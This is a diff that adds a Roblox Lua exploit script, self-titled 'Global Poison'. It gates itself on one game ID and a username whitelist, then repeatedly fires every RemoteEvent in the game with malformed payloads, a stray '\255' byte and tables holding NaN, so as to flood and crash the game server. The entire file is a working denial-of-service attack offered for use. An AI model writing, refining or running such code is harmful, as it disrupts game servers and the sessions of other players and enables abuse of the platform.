@@ -1,0 +1,55 @@
+-- [[ Script Hub by Oorbits - Secured Global Poison ]] --
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+-- 1. SECURITY CONFIGURATION
+local TARGET_GAME_ID = 74951754415707
+local WHITELIST = {
+    ["YourUsernameHere"] = true, -- Replace with your actual username
+    ["Oorbits"] = true,          -- Your alias
+}
+
+-- 2. ACCESS CHECK
+if game.PlaceId ~= TARGET_GAME_ID then
+    lp:Kick("\n[Oorbits Security]\nUnauthorized Game Detected.")
+    return
+end
+
+if not WHITELIST[lp.Name] then
+    lp:Kick("\n[Oorbits Security]\nUser '" .. lp.Name .. "' is not whitelisted.")
+    return
+end
+
+-- 3. THE UNIVERSAL POISON
+local poison = "\255"
+local poisonTable = {
+    ["1"] = poison,
+    ["2"] = poison,
+    ["Crash"] = 0/0
+}
+
+print("Oorbits: Access Granted. Initiating Saturation...")
+
+-- 4. THE EXECUTION LOOP
+local function executeGlobalFlood()
+    local startTime = tick()
+    
+    while tick() - startTime < 1.5 do
+        for _, remote in ipairs(game:GetDescendants()) do
+            if remote:IsA("RemoteEvent") then
+                pcall(function()
+                    remote:FireServer(poison)
+                    remote:FireServer(poisonTable)
+                    remote:FireServer(unpack({poisonTable, {}}))
+                end)
+            end
+        end
+        task.wait()
+    end
+end
+
+-- 5. RUN
+executeGlobalFlood()
+print("Oorbits: Global saturation complete.")
